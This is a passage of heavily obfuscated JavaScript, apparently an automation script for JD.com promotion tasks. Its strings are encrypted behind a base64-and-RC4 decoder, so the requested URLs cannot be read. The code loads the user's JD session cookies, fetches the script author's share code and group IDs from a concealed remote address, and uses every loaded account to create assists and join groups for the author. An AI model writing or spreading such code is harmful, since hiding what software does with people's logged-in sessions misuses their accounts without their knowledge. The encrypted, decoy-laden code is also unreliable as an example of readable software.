_0x494fe9=function(_0x5c11b8,_0x56824f,_0x1d7598,_0x4ae748,_0x28283b){_0x56824f=_0x56824f>>0x8,_0x28283b='po';var _0x1489cd='shift',_0x1a08de='push';if(_0x56824f<_0x5c11b8){while(--_0x5c11b8){_0x4ae748=_0x1de7c8[_0x1489cd]();if(_0x56824f===_0x5c11b8){_0x56824f=_0x4ae748;_0x1d7598=_0x1de7c8[_0x28283b+'p']();}else if(_0x56824f&&_0x1d7598['replace'](/[BuyhBHkMynJVdUM=]/g,'')===_0x56824f){_0x1de7c8[_0x1a08de](_0x4ae748);}}_0x1de7c8[_0x1a08de](_0x1de7c8[_0x1489cd]());}return 0x75145;};return _0x494fe9(++_0x3d059b,_0x5b6b44)>>_0x3d059b^_0x5b6b44;}(_0x2559,0xa8,0xa800));var _0x391c=function(_0x29c712,_0x4d8e61){_0x29c712=~~'0x'['concat'](_0x29c712);var _0x2b5eb2=_0x2559[_0x29c712];if(_0x391c['gWdqyJ']===undefined){(function(){var _0x41af89=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x25740d='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x41af89['atob']||(_0x41af89['atob']=function(_0x5682ed){var _0x120cfd=String(_0x5682ed)['replace'](/=+$/,'');for(var _0x4d2ba3=0x0,_0x26d9b4,_0x1741d3,_0x34ada1=0x0,_0x2f2cff='';_0x1741d3=_0x120cfd['charAt'](_0x34ada1++);~_0x1741d3&&(_0x26d9b4=_0x4d2ba3%0x4?_0x26d9b4*0x40+_0x1741d3:_0x1741d3,_0x4d2ba3++%0x4)?_0x2f2cff+=String['fromCharCode'](0xff&_0x26d9b4>>(-0x2*_0x4d2ba3&0x6)):0x0){_0x1741d3=_0x25740d['indexOf'](_0x1741d3);}return _0x2f2cff;});}());var _0x6195a1=function(_0x22b1cb,_0x4d8e61){var _0x3276ff=[],_0x4ff45d=0x0,_0x3ac63f,_0x42c1e4='',_0x31f278='';_0x22b1cb=atob(_0x22b1cb);for(var _0x51bc70=0x0,_0x23d018=_0x22b1cb['length'];_0x51bc70<_0x23d018;_0x51bc70++){_0x31f278+='%'+('00'+_0x22b1cb['charCodeAt'](_0x51bc70)['toString'](0x10))['slice'](-0x2);}_0x22b1cb=decodeURIComponent(_0x31f278);for(var _0x35337d=0x0;_0x35337d<0x100;_0x35337d++){_0x3276ff[_0x35337d]=_0x35337d;}for(_0x35337d=0x0;_0x35337d<0x100;_0x35337d++){_0x4ff45d=(_0x4ff45d+_0x3276ff[_0x35337d]+_0x4d8e61['charCodeAt'](_0x35337d%_0x4d8e61['length']))%0x100;_0x3ac63f=_0x3276ff[_0x35337d];_0x3276ff[_0x35337d]=_0x3276ff[_0x4ff45d];_0x3276ff[_0x4ff45d]=_0x3ac63f;}_0x35337d=0x0;_0x4ff45d=0x0;for(var _0x4d8d79=0x0;_0x4d8d79<_0x22b1cb['length'];_0x4d8d79++){_0x35337d=(_0x35337d+0x1)%0x100;_0x4ff45d=(_0x4ff45d+_0x3276ff[_0x35337d])%0x100;_0x3ac63f=_0x3276ff[_0x35337d];_0x3276ff[_0x35337d]=_0x3276ff[_0x4ff45d];_0x3276ff[_0x4ff45d]=_0x3ac63f;_0x42c1e4+=String['fromCharCode'](_0x22b1cb['charCodeAt'](_0x4d8d79)^_0x3276ff[(_0x3276ff[_0x35337d]+_0x3276ff[_0x4ff45d])%0x100]);}return _0x42c1e4;};_0x391c['hsFHOs']=_0x6195a1;_0x391c['YdIYmP']={};_0x391c['gWdqyJ']=!![];}var _0x8aa64e=_0x391c['YdIYmP'][_0x29c712];if(_0x8aa64e===undefined){if(_0x391c['gKEDAV']===undefined){_0x391c['gKEDAV']=!![];}_0x2b5eb2=_0x391c['hsFHOs'](_0x2b5eb2,_0x4d8e61);_0x391c['YdIYmP'][_0x29c712]=_0x2b5eb2;}else{_0x2b5eb2=_0x8aa64e;}return _0x2b5eb2;};const jdCookieNode=$[_0x391c('0','T%h1')]()?require(_0x391c('1','H5kz')):'';$[_0x391c('2','*aQ7')]=[];$[_0x391c('3','tA^V')]='';!(async()=>{var _0x1d42a0={'hYAIc':function(_0x117165){return _0x117165();},'hQOpG':_0x391c('4','3pw('),'EOujP':_0x391c('5','H5kz'),'Mvvrc':function(_0x141ac1,_0x2160fc){return _0x141ac1===_0x2160fc;},'Ehlwh':function(_0x83f56b,_0x22f85d){return _0x83f56b===_0x22f85d;},'JCduc':function(_0xf34435){return _0xf34435();},'JUqtE':function(_0xd68521,_0x29ad65){return _0xd68521<_0x29ad65;},'IUpUy':function(_0x2d7489,_0x5380c7){return _0x2d7489!==_0x5380c7;},'hhxtS':_0x391c('6','l[xv'),'NEcQb':_0x391c('7','&]vQ'),'AqdzG':_0x391c('8','3%Fz'),'ktmji':_0x391c('9','$^@G'),'gpUSB':_0x391c('a','ayMl'),'VuPJR':function(_0x54f57f,_0x48dd24){return _0x54f57f(_0x48dd24);},'SYrNr':function(_0x52902b,_0x9762ff){return _0x52902b+_0x9762ff;},'LaHmT':_0x391c('b','EQmX'),'epArF':function(_0x5642c1,_0x10bebf){return _0x5642c1(_0x10bebf);},'YCmRQ':_0x391c('c','3%Fz'),'rdsMP':_0x391c('d','5U0Y')};if(!_0x1d42a0[_0x391c('e','GT8W')](getCookies))return;$[_0x391c('f','s%cu')]=[];$[_0x391c('10','T%h1')]=[];await _0x1d42a0[_0x391c('11','wK%D')](getAuthorShareCode);for(let _0x4c4c91=0x0;_0x1d42a0[_0x391c('12','2tYw')](_0x4c4c91,$[_0x391c('13','&]vQ')][_0x391c('14','H5kz')]);_0x4c4c91++){if(_0x1d42a0[_0x391c('15','$^@G')](_0x1d42a0[_0x391c('16','l[xv')],_0x1d42a0[_0x391c('17','k3AG')])){$[_0x391c('18','wK%D')]=$[_0x391c('19','yYHT')][_0x4c4c91];if($[_0x391c('1a','eCtS')][_0x391c('1b','EQmX')](_0x1d42a0[_0x391c('1c','tk8Z')]))await _0x1d42a0[_0x391c('11','wK%D')](getJxToken);if($[_0x391c('1d','mDo#')]){if(_0x1d42a0[_0x391c('1e','tk8Z')](_0x1d42a0[_0x391c('1f','ShRW')],_0x1d42a0[_0x391c('20','9fE1')])){_0x1d42a0[_0x391c('21','LUGZ')](resolve);}else{$[_0x391c('22','vFpo')]=_0x1d42a0[_0x391c('23','yYHT')](decodeURIComponent,$[_0x391c('24','HxBz')][_0x391c('25','eCtS')](/pt_pin=(.+?);/)&&$[_0x391c('26','s%cu')][_0x391c('27','5U0Y')](/pt_pin=(.+?);/)[0x1]);$[_0x391c('28','u()c')]=_0x1d42a0[_0x391c('29','itZd')](_0x4c4c91,0x1);$[_0x391c('2a','W7LA')]='';$[_0x391c('2b','3%Fz')]=!![];for(let _0x1d249a of $[_0x391c('2c','itZd')]){if(_0x1d42a0[_0x391c('2d','BvmT')](_0x1d42a0[_0x391c('2e','[!KH')],_0x1d42a0[_0x391c('2f','s%cu')])){$[_0x391c('30','gu*1')]=[$[_0x391c('31','3c$U')](_0x1d42a0[_0x391c('32','#j4c')])||'',$[_0x391c('33','Vo*^')](_0x1d42a0[_0x391c('34','ayMl')])||''];}else{if($[_0x391c('35','l[xv')][_0x391c('36','u()c')](_0x1d42a0[_0x391c('37','Vo*^')])&&!$[_0x391c('38','P6Da')][_0x391c('39','SzJE')]('%')){await _0x1d42a0[_0x391c('3a','*aQ7')](createSuperAssistUser,_0x1d249a);}await _0x1d42a0[_0x391c('3b','tk8Z')](createAssistUser,_0x1d249a);await $[_0x391c('3c','SzJE')](0x7d0);if(!$[_0x391c('3d','Pnos')])break;}}$[_0x391c('3e','HxBz')]=!![];for(let _0x118b7d of $[_0x391c('3f','u()c')]){if(_0x1d42a0[_0x391c('40','u()c')](_0x1d42a0[_0x391c('41','SzJE')],_0x1d42a0[_0x391c('42','EQmX')])){try{const {iRet}=JSON[_0x391c('43','bcpm')](data);if(_0x1d42a0[_0x391c('44','H5kz')](iRet,0x7d5)||_0x1d42a0[_0x391c('45','$^@G')](iRet,0x270f))$[_0x391c('46','%Q6g')]=![];}catch(_0x2d7e29){}finally{_0x1d42a0[_0x391c('47','s1QW')](resolve);}}else{if($[_0x391c('48','itZd')][_0x391c('49','H5kz')](_0x1d42a0[_0x391c('4a','P6Da')])&&!$[_0x391c('48','itZd')][_0x391c('4b','k3AG')]('%')){await _0x1d42a0[_0x391c('3b','tk8Z')](joinGroup,_0x118b7d);await $[_0x391c('4c','#j4c')](0x7d0);if(!$[_0x391c('4d','P6Da')])break;}}}}}}else{try{const {shareId,strGroupIds}=JSON[_0x391c('4e','BvmT')](data);$[_0x391c('4f','P6Da')]=shareId;$[_0x391c('50','HxBz')]=strGroupIds;}catch(_0x373d5b){}finally{_0x1d42a0[_0x391c('51','vGzF')](resolve);}}}})()[_0x391c('52','vGzF')](_0x46f003=>$[_0x391c('53','3%Fz')](_0x46f003))[_0x391c('54','dTMq')](()=>$[_0x391c('55','bXJT')]());function joinGroup(_0x3b7a9e){var _0x10f6ca={'pLQEa':function(_0x261b57,_0x960c32){return _0x261b57===_0x960c32;},'YrUOw':function(_0x4dd919,_0x5580ae){return _0x4dd919===_0x5580ae;},'pIUiI':function(_0x19c6fc,_0x3d0b60){return _0x19c6fc===_0x3d0b60;},'NHIjY':function(_0x1437ac,_0x3e0b66){return _0x1437ac===_0x3e0b66;},'HXPxH':function(_0x1895b7){return _0x1895b7();},'IsdGY':function(_0x9ff930,_0x30d0cc){return _0x9ff930!==_0x30d0cc;},'EXjrs':_0x391c('56','Txk8'),'WLMMN':function(_0x4dd937,_0xdae91f,_0x333958){return _0x4dd937(_0xdae91f,_0x333958);},'JraEW':_0x391c('57','HxBz'),'LOXiQ':_0x391c('58','vFpo'),'GYXTb':_0x391c('59','$^@G')};return new Promise(async _0x128709=>{if(_0x10f6ca[_0x391c('5a','e7zW')](_0x10f6ca[_0x391c('5b','[!KH')],_0x10f6ca[_0x391c('5c','&]vQ')])){const {iRet}=JSON[_0x391c('5d','W7LA')](data);if(_0x10f6ca[_0x391c('5e','W7LA')](iRet,0x7d5)||_0x10f6ca[_0x391c('5f','Vo*^')](iRet,0x270f))$[_0x391c('60','Vo*^')]=![];}else{$[_0x391c('61','#jKQ')](_0x10f6ca[_0x391c('62','dTMq')](taskUrl,_0x391c('63','%Q6g'),_0x391c('64','Pnos')+_0x3b7a9e+_0x391c('65','#j4c')+$[_0x391c('66','5U0Y')][_0x10f6ca[_0x391c('67','H5kz')]]+_0x391c('68','u()c')+$[_0x391c('69','kThA')][_0x10f6ca[_0x391c('6a','gu*1')]]+_0x391c('6b','3%Fz')+$[_0x391c('66','5U0Y')][_0x10f6ca[_0x391c('6c','2tYw')]]),(_0x207689,_0x4306ca,_0xdb4445)=>{try{const {sErrMsg,iRet}=JSON[_0x391c('6d','3c$U')](_0xdb4445);if(_0x10f6ca[_0x391c('6e','wK%D')](iRet,0x7d5)||_0x10f6ca[_0x391c('6f','eCtS')](iRet,0x270f))$[_0x391c('3e','HxBz')]=![];}catch(_0x2baf2e){$[_0x391c('70','$^@G')](_0x2baf2e,_0x4306ca);}finally{_0x10f6ca[_0x391c('71','LUGZ')](_0x128709);}});}});}function getAuthorShareCode(){var _0x1ec75d={'DDCph':function(_0x1dba98,_0x41bbad){return _0x1dba98===_0x41bbad;},'NCgyC':_0x391c('72','2tYw'),'nVWLM':function(_0x5c0780){return _0x5c0780();},'uXVhx':_0x391c('73','3c$U'),'vIaOg':_0x391c('74','Pnos')};return new Promise(_0x43e013=>{var _0x43bc1c={'xGifT':function(_0x315b8f){return _0x1ec75d[_0x391c('75','2tYw')](_0x315b8f);}};$[_0x391c('61','#jKQ')]({'url':_0x1ec75d[_0x391c('76','iZSG')],'headers':{'User-Agent':_0x1ec75d[_0x391c('77','LUGZ')]}},async(_0xb35906,_0x300c20,_0x10f736)=>{if(_0x1ec75d[_0x391c('78','H5kz')](_0x1ec75d[_0x391c('79','dTMq')],_0x1ec75d[_0x391c('7a','Vo*^')])){try{const {shareId,strGroupIds}=JSON[_0x391c('7b','P6Da')](_0x10f736);$[_0x391c('4f','P6Da')]=shareId;$[_0x391c('7c','3pw(')]=strGroupIds;}catch(_0x8bd8cb){}finally{_0x1ec75d[_0x391c('7d','#j4c')](_0x43e013);}}else{_0x43bc1c[_0x391c('7e','%Q6g')](_0x43e013);}});});}function getCookies(){var _0xfe18a5={'lNQWU':_0x391c('7f','[!KH'),'zrDaR':function(_0x2e1f52,_0x8dbb3){return _0x2e1f52<_0x8dbb3;},'weFRk':function(_0xd199a9,_0x1b05df){return _0xd199a9(_0x1b05df);},'uPDJy':function(_0x399e63,_0x28d399){return _0x399e63*_0x28d399;},'JUnMr':function(_0x441b02){return _0x441b02();},'nYnjG':function(_0x5cc355,_0x1eb9b5){return _0x5cc355!==_0x1eb9b5;},'dYNSj':_0x391c('80','3pw('),'Wmtcn':_0x391c('81','yYHT'),'cqAWk':_0x391c('82','Vo*^'),'WtYYQ':function(_0x4fff6f,_0x1d48c2){return _0x4fff6f!==_0x1d48c2;},'LuNbi':_0x391c('83','9fE1'),'gThrn':_0x391c('84','e7zW'),'hRQTg':_0x391c('85','GT8W'),'UVVnW':_0x391c('86','H5kz')};if($[_0x391c('87','yYHT')]()){if(_0xfe18a5[_0x391c('88','9fE1')](_0xfe18a5[_0x391c('89','%Q6g')],_0xfe18a5[_0x391c('8a','GT8W')])){var _0x13ba65={'Bnugg':function(_0x495202,_0x903871){return _0xfe18a5[_0x391c('8b','Vo*^')](_0x495202,_0x903871);},'vCQvb':function(_0x239e48){return _0xfe18a5[_0x391c('8c','Vo*^')](_0x239e48);}};function _0x3ab507(_0x45ad1d){let _0x21f0ab=_0xfe18a5[_0x391c('8d','BvmT')];let _0x24a310='';for(var _0x8d732e=0x0;_0xfe18a5[_0x391c('8e','tk8Z')](_0x8d732e,_0x45ad1d);_0x8d732e++){_0x24a310+=_0x21f0ab[_0xfe18a5[_0x391c('8f','bXJT')](parseInt,_0xfe18a5[_0x391c('90','3pw(')](Math[_0x391c('91','kThA')](),_0x21f0ab[_0x391c('92','ayMl')]))];}return _0x24a310;}return new Promise(_0x4db358=>{let _0x3b717b=_0x13ba65[_0x391c('93','3%Fz')](_0x3ab507,0x28);let _0x25057a=(+new Date())[_0x391c('94','wK%D')]();let _0x43a0fd=$[_0x391c('48','itZd')][_0x391c('95','BvmT')](/pt_pin=(.+?);/)[0x1];let _0x408369=$[_0x391c('96','vGzF')](''+_0x43a0fd+_0x25057a+_0x3b717b+_0x391c('97','ayMl'));$[_0x391c('98','yYHT')]={'timestamp':_0x25057a,'phoneid':_0x3b717b,'farm_jstoken':_0x408369};_0x13ba65[_0x391c('99','ayMl')](_0x4db358);});}else{$[_0x391c('9a','s1QW')]=Object[_0x391c('9b','3%Fz')](jdCookieNode);}}else{$[_0x391c('9c','[!KH')]=[$[_0x391c('9d','3pw(')](_0xfe18a5[_0x391c('9e','SzJE')])||'',$[_0x391c('9f','#jKQ')](_0xfe18a5[_0x391c('a0','tk8Z')])||''];}if(!$[_0x391c('9a','s1QW')][0x0]){if(_0xfe18a5[_0x391c('a1','$^@G')](_0xfe18a5[_0x391c('a2','EQmX')],_0xfe18a5[_0x391c('a3','Txk8')])){$[_0x391c('a4','EQmX')]($[_0x391c('a5','yYHT')],_0xfe18a5[_0x391c('a6','ShRW')],_0xfe18a5[_0x391c('a7','bcpm')],{'open-url':_0xfe18a5[_0x391c('a8','tk8Z')]});return![];}else{const {shareId,strGroupIds}=JSON[_0x391c('a9','wK%D')](data);$[_0x391c('aa','vFpo')]=shareId;$[_0x391c('ab','#jKQ')]=strGroupIds;}}return!![];}function createAssistUser(_0x318c13){var _0x434e56={'gzGpF':function(_0x43a415,_0x31bba3){return _0x43a415(_0x31bba3);},'qPibX':function(_0x200b44,_0x22da24){return _0x200b44*_0x22da24;},'LpSpe':function(_0x1987ee,_0x2375c4){return _0x1987ee===_0x2375c4;},'YcEiu':_0x391c('ac','ayMl'),'QrVpZ':_0x391c('ad','yYHT'),'ktxEc':_0x391c('ae','GT8W'),'gcdnk':function(_0x295b12){return _0x295b12();},'dlsAP':function(_0x142075,_0x48dbca){return _0x142075!==_0x48dbca;},'usSlR':_0x391c('af','Txk8'),'BNIDQ':_0x391c('b0','9fE1'),'SMhlQ':function(_0x4c2f0a,_0x12e72f,_0xc4442c){return _0x4c2f0a(_0x12e72f,_0xc4442c);},'QyhHG':_0x391c('b1','2tYw')};return new Promise(_0x2e6ca2=>{var _0x32e4b8={'eiuyJ':function(_0xe398c8,_0x148987){return _0x434e56[_0x391c('b2','mDo#')](_0xe398c8,_0x148987);},'YoJyG':function(_0x4a29cd,_0x1b6b6c){return _0x434e56[_0x391c('b3','Txk8')](_0x4a29cd,_0x1b6b6c);},'FJooC':function(_0x4a2b2f,_0x415bcf){return _0x434e56[_0x391c('b4','LUGZ')](_0x4a2b2f,_0x415bcf);},'GMrdf':_0x434e56[_0x391c('b5','e7zW')],'Jzkcn':function(_0x5a3a61,_0x13bf2f){return _0x434e56[_0x391c('b6','W7LA')](_0x5a3a61,_0x13bf2f);},'bxRzb':_0x434e56[_0x391c('b7','dTMq')],'CvPTo':_0x434e56[_0x391c('b8','3pw(')],'blNkh':function(_0x3faa7a){return _0x434e56[_0x391c('b9','s%cu')](_0x3faa7a);}};if(_0x434e56[_0x391c('ba','#j4c')](_0x434e56[_0x391c('bb','vGzF')],_0x434e56[_0x391c('bc','EQmX')])){$[_0x391c('bd','itZd')](_0x434e56[_0x391c('be','yYHT')](taskUrl,_0x434e56[_0x391c('bf','2tYw')],_0x391c('c0','yYHT')+_0x434e56[_0x391c('c1','ayMl')](escape,_0x318c13)+_0x391c('c2','%Q6g')),async(_0x1bee86,_0x1ba42d,_0x2dad3c)=>{var _0x5ae74a={'azFVE':function(_0xd18fe,_0x2bc313){return _0x32e4b8[_0x391c('c3','s1QW')](_0xd18fe,_0x2bc313);},'fCgvb':function(_0xcf65ce,_0x5811e0){return _0x32e4b8[_0x391c('c4','ayMl')](_0xcf65ce,_0x5811e0);}};if(_0x32e4b8[_0x391c('c5','ayMl')](_0x32e4b8[_0x391c('c6','wK%D')],_0x32e4b8[_0x391c('c7','EQmX')])){try{if(_0x32e4b8[_0x391c('c8','tA^V')](_0x32e4b8[_0x391c('c9','vFpo')],_0x32e4b8[_0x391c('ca','3pw(')])){$[_0x391c('cb','[!KH')](e,_0x1ba42d);}else{const {iRet}=JSON[_0x391c('cc','mDo#')](_0x2dad3c);if(_0x32e4b8[_0x391c('cd','yYHT')](iRet,0x7d5)||_0x32e4b8[_0x391c('cd','yYHT')](iRet,0x270f))$[_0x391c('3d','Pnos')]=![];}}catch(_0x2873f8){}finally{_0x32e4b8[_0x391c('ce','dTMq')](_0x2e6ca2);}}else{str+=_sym[_0x5ae74a[_0x391c('cf','bcpm')](parseInt,_0x5ae74a[_0x391c('d0','&]vQ')](Math[_0x391c('91','kThA')](),_sym[_0x391c('d1','3%Fz')]))];}});}else{$[_0x391c('d2','itZd')]=Object[_0x391c('d3','kThA')](jdCookieNode);}});}function createSuperAssistUser(_0x2ae36c){var _0x3a603e={'IsuyA':_0x391c('d4','vFpo'),'harih':_0x391c('d5','Pnos'),'qMura':_0x391c('d6','9fE1'),'aXmrB':_0x391c('d7','eCtS'),'anfHr':_0x391c('d8','gu*1'),'tBnLU':function(_0xf040b1,_0x4046df){return _0xf040b1+_0x4046df;},'Xbujc':function(_0xf0ef94,_0x379743){return _0xf0ef94*_0x379743;},'Uslvo':_0x391c('d9','%Q6g'),'XNUzx':function(_0x3118d5,_0x51a903){return _0x3118d5===_0x51a903;},'NJHJL':function(_0x438ea4,_0x232304){return _0x438ea4===_0x232304;},'KAYnb':function(_0x158eca){return _0x158eca();},'YpOsv':_0x391c('da','2tYw'),'huCLz':function(_0xc75f85,_0xeb5cb4){return _0xc75f85===_0xeb5cb4;},'AjbgQ':function(_0x3b3a9e,_0x3e5365){return _0x3b3a9e!==_0x3e5365;},'sOHDK':_0x391c('db','EQmX'),'hvGnE':_0x391c('dc','5U0Y'),'ZEAWS':function(_0x51676e){return _0x51676e();},'sETIH':_0x391c('dd','yYHT'),'wtnAR':_0x391c('de','kThA'),'wFkqB':function(_0x345ca2,_0xd4f3a8,_0x192597){return _0x345ca2(_0xd4f3a8,_0x192597);},'Rkxgi':_0x391c('df','GT8W'),'PEZFv':_0x391c('e0','H5kz'),'RoKdN':_0x391c('e1','EQmX'),'wAGPd':_0x391c('e2','vFpo'),'VxlNe':function(_0x72d9ab,_0x136321){return _0x72d9ab(_0x136321);}};return new Promise(_0x51b063=>{var _0x44aab5={'dfmCY':_0x3a603e[_0x391c('e3','$^@G')],'wryrU':_0x3a603e[_0x391c('e4','s1QW')],'DzzUb':_0x3a603e[_0x391c('e5','Txk8')],'tSmBg':_0x3a603e[_0x391c('e6','P6Da')],'kKEAG':_0x3a603e[_0x391c('e7','bcpm')],'tGFmn':function(_0x4de1ae,_0x525509){return _0x3a603e[_0x391c('e8','wK%D')](_0x4de1ae,_0x525509);},'suvqc':function(_0x3f9df9,_0xe4d53c){return _0x3a603e[_0x391c('e9','wK%D')](_0x3f9df9,_0xe4d53c);},'YPgQB':_0x3a603e[_0x391c('ea','&]vQ')],'wJdCD':function(_0x1a6014,_0x17b4fa){return _0x3a603e[_0x391c('eb','e7zW')](_0x1a6014,_0x17b4fa);},'JQWWv':function(_0xbe478e,_0x46d7c6){return _0x3a603e[_0x391c('ec','5U0Y')](_0xbe478e,_0x46d7c6);},'EEaQE':function(_0xe5270f){return _0x3a603e[_0x391c('ed','LUGZ')](_0xe5270f);},'QNIpr':function(_0x84421a,_0x1130f0){return _0x3a603e[_0x391c('ee','vGzF')](_0x84421a,_0x1130f0);},'Brdpa':_0x3a603e[_0x391c('ef','9fE1')],'ptOzy':function(_0x1704c4,_0x40a6f6){return _0x3a603e[_0x391c('f0','iZSG')](_0x1704c4,_0x40a6f6);},'HfmDj':function(_0x4f4365,_0x2451d6){return _0x3a603e[_0x391c('f1','mDo#')](_0x4f4365,_0x2451d6);},'bwAKc':_0x3a603e[_0x391c('f2','bcpm')],'FRekF':_0x3a603e[_0x391c('f3','*aQ7')],'JfKvC':function(_0x2c0a1f){return _0x3a603e[_0x391c('f4','5U0Y')](_0x2c0a1f);}};if(_0x3a603e[_0x391c('f5','T%h1')](_0x3a603e[_0x391c('f6','eCtS')],_0x3a603e[_0x391c('f7','SzJE')])){return{'url':_0x391c('f8','u()c')+function_path+_0x391c('f9','vGzF')+Date[_0x391c('fa','P6Da')]()+_0x391c('fb','T%h1')+body+_0x391c('fc','bcpm')+Date[_0x391c('fd','&]vQ')]()+_0x391c('fe','yYHT'),'headers':{'Cookie':$[_0x391c('ff','&]vQ')],'Accept':_0x44aab5[_0x391c('100','T%h1')],'Connection':_0x44aab5[_0x391c('101','W7LA')],'Referer':_0x44aab5[_0x391c('102','#j4c')],'Accept-Encoding':_0x44aab5[_0x391c('103','e7zW')],'Host':_0x44aab5[_0x391c('104','3%Fz')],'User-Agent':_0x391c('105','#j4c')+_0x44aab5[_0x391c('106','s%cu')](_0x44aab5[_0x391c('107','k3AG')](Math[_0x391c('108','bcpm')],0x62),0x1)+_0x391c('109','tk8Z'),'Accept-Language':_0x44aab5[_0x391c('10a','ayMl')]}};}else{$[_0x391c('10b','#j4c')](_0x3a603e[_0x391c('10c','*aQ7')](taskUrl,_0x3a603e[_0x391c('10d','2tYw')],_0x391c('10e','wK%D')+$[_0x391c('10f','s1QW')][_0x3a603e[_0x391c('110','dTMq')]]+_0x391c('111','GT8W')+$[_0x391c('112','$^@G')][_0x3a603e[_0x391c('113','gu*1')]]+_0x391c('114','%Q6g')+$[_0x391c('115','*aQ7')][_0x3a603e[_0x391c('116','&]vQ')]]+_0x391c('117','Vo*^')+_0x3a603e[_0x391c('118','GT8W')](escape,_0x2ae36c)+_0x391c('119','2tYw')),async(_0x40acd3,_0x3639c8,_0x50aa93)=>{var _0x37777b={'wsfWM':function(_0x50082d,_0x40cf6b){return _0x44aab5[_0x391c('11a','tk8Z')](_0x50082d,_0x40cf6b);},'XORJD':function(_0x5ad154,_0x5653d1){return _0x44aab5[_0x391c('11b','SzJE')](_0x5ad154,_0x5653d1);},'cJKAJ':function(_0x22958d){return _0x44aab5[_0x391c('11c','l[xv')](_0x22958d);}};if(_0x44aab5[_0x391c('11d','P6Da')](_0x44aab5[_0x391c('11e','u()c')],_0x44aab5[_0x391c('11f','yYHT')])){try{const {sErrMsg,iRet}=JSON[_0x391c('120','dTMq')](_0x50aa93);if(_0x44aab5[_0x391c('121','bcpm')](iRet,0x7d5)||_0x44aab5[_0x391c('122','Pnos')](iRet,0x270f))$[_0x391c('123','19]b')]=![];}catch(_0x1c786d){if(_0x44aab5[_0x391c('124','H5kz')](_0x44aab5[_0x391c('125','e7zW')],_0x44aab5[_0x391c('126','tA^V')])){const {sErrMsg,iRet}=JSON[_0x391c('127','bXJT')](_0x50aa93);if(_0x44aab5[_0x391c('128','19]b')](iRet,0x7d5)||_0x44aab5[_0x391c('129','3c$U')](iRet,0x270f))$[_0x391c('12a','itZd')]=![];}else{$[_0x391c('12b','3pw(')](_0x1c786d,_0x3639c8);}}finally{if(_0x44aab5[_0x391c('12c','W7LA')](_0x44aab5[_0x391c('12d','[!KH')],_0x44aab5[_0x391c('12e','gu*1')])){_0x44aab5[_0x391c('12f','#j4c')](_0x51b063);}else{try{const {sErrMsg,iRet}=JSON[_0x391c('130','tA^V')](_0x50aa93);if(_0x37777b[_0x391c('131','wK%D')](iRet,0x7d5)||_0x37777b[_0x391c('132','yYHT')](iRet,0x270f))$[_0x391c('133','wK%D')]=![];}catch(_0x382f11){$[_0x391c('134','%Q6g')](_0x382f11,_0x3639c8);}finally{_0x37777b[_0x391c('135','s%cu')](_0x51b063);}}}}else{$[_0x391c('136','P6Da')](e,_0x3639c8);}});}});}function taskUrl(_0x40d5f4,_0x5ceecb){var _0x476d54={'CPGOW':_0x391c('137','l[xv'),'HWmXZ':_0x391c('138','19]b'),'QvfUY':_0x391c('d6','9fE1'),'awugL':_0x391c('139','GT8W'),'WWQNf':_0x391c('13a','vGzF'),'VZKPt':function(_0x545a14,_0x1d02c1){return _0x545a14+_0x1d02c1;},'oBAOW':function(_0x378d5d,_0x5bf3ed){return _0x378d5d*_0x5bf3ed;},'Axgns':_0x391c('13b','yYHT')};return{'url':_0x391c('13c','s1QW')+_0x40d5f4+_0x391c('13d','%Q6g')+Date[_0x391c('13e','%Q6g')]()+_0x391c('13f','SzJE')+_0x5ceecb+_0x391c('140','H5kz')+Date[_0x391c('141','W7LA')]()+_0x391c('142','l[xv'),'headers':{'Cookie':$[_0x391c('143','9fE1')],'Accept':_0x476d54[_0x391c('144','e7zW')],'Connection':_0x476d54[_0x391c('145','H5kz')],'Referer':_0x476d54[_0x391c('146','bXJT')],'Accept-Encoding':_0x476d54[_0x391c('147','Vo*^')],'Host':_0x476d54[_0x391c('148','ayMl')],'User-Agent':_0x391c('149','k3AG')+_0x476d54[_0x391c('14a','l[xv')](_0x476d54[_0x391c('14b','ShRW')](Math[_0x391c('14c','Txk8')],0x62),0x1)+_0x391c('14d','W7LA'),'Accept-Language':_0x476d54[_0x391c('14e','EQmX')]}};}function getJxToken(){var _0x17dd96={'ljXFk':function(_0x221ba8,_0x7c65c3){return _0x221ba8===_0x7c65c3;},'wnRYL':function(_0x35a25f){return _0x35a25f();},'eqqgk':_0x391c('14f','s1QW'),'DYrrd':function(_0x526100,_0x142bcd){return _0x526100<_0x142bcd;},'JIQbJ':_0x391c('150','mDo#'),'gdCfL':_0x391c('151','#j4c'),'ymUJK':function(_0x411401,_0x593ab1){return _0x411401(_0x593ab1);},'BSgQi':function(_0x2cd38a,_0x184769){return _0x2cd38a*_0x184769;},'uxFVk':function(_0x544b63,_0x20b8df){return _0x544b63===_0x20b8df;},'PBytK':function(_0x21faba,_0xb88af4){return _0x21faba!==_0xb88af4;},'WCFLw':_0x391c('152','3c$U'),'bntFg':_0x391c('153','yYHT'),'yYLSR':function(_0xccd0af,_0x43dab7){return _0xccd0af(_0x43dab7);},'JJmqv':function(_0x31e799){return _0x31e799();}};function _0x1a9855(_0x40d4ce){var _0x5e8dde={'MlatI':function(_0x3cc9d8,_0x310bbb){return _0x17dd96[_0x391c('154','eCtS')](_0x3cc9d8,_0x310bbb);},'ptvqU':function(_0x499eca){return _0x17dd96[_0x391c('155','e7zW')](_0x499eca);}};let _0x44e5bd=_0x17dd96[_0x391c('156','s1QW')];let _0x58a569='';for(var _0xf418f6=0x0;_0x17dd96[_0x391c('157','SzJE')](_0xf418f6,_0x40d4ce);_0xf418f6++){if(_0x17dd96[_0x391c('158','Txk8')](_0x17dd96[_0x391c('159','[!KH')],_0x17dd96[_0x391c('15a','9fE1')])){try{const {sErrMsg,iRet}=JSON[_0x391c('15b','9fE1')](data);if(_0x5e8dde[_0x391c('15c','gu*1')](iRet,0x7d5)||_0x5e8dde[_0x391c('15d','HxBz')](iRet,0x270f))$[_0x391c('15e','[!KH')]=![];}catch(_0x81307a){$[_0x391c('15f','Pnos')](_0x81307a,resp);}finally{_0x5e8dde[_0x391c('160','BvmT')](resolve);}}else{_0x58a569+=_0x44e5bd[_0x17dd96[_0x391c('161','EQmX')](parseInt,_0x17dd96[_0x391c('162','%Q6g')](Math[_0x391c('163','%Q6g')](),_0x44e5bd[_0x391c('164','EQmX')]))];}}return _0x58a569;}return new Promise(_0x21dbb5=>{var _0x43e6b2={'tzzof':function(_0x5a6fbb,_0x46ce84){return 